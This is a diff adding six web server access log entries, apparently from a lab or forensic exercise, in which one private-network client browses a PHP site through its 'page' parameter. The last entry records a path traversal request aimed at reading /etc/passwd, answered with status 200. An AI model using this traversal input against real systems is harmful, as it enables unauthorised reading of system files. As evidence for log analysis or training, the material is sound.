@@ -1,0 +1,6 @@
+192.168.1.20 - - [03/Apr/2024:15:22:13 +0200] "GET / HTTP/1.1" 200 2709 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
+192.168.1.20 - - [03/Apr/2024:15:22:48 +0200] "GET /index.php?page=about.php HTTP/1.1" 200 2088 "http://192.168.1.10/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
+192.168.1.20 - - [03/Apr/2024:15:27:09 +0200] "GET /index.php?page=services.php HTTP/1.1" 200 2069 "http://192.168.1.10/index.php?page=about.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
+192.168.1.20 - - [03/Apr/2024:15:28:01 +0200] "GET /index.php HTTP/1.1" 200 2709 "http://192.168.1.10/index.php?page=services.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
+192.168.1.20 - - [03/Apr/2024:15:29:19 +0200] "GET /index.php?page=services.php HTTP/1.1" 200 2069 "http://192.168.1.10/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
+192.168.1.20 - - [03/Apr/2024:15:30:54 +0200] "GET /index.php?page=../../../../../../../../../../../../../etc/passwd HTTP/1.1" 200 1998 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
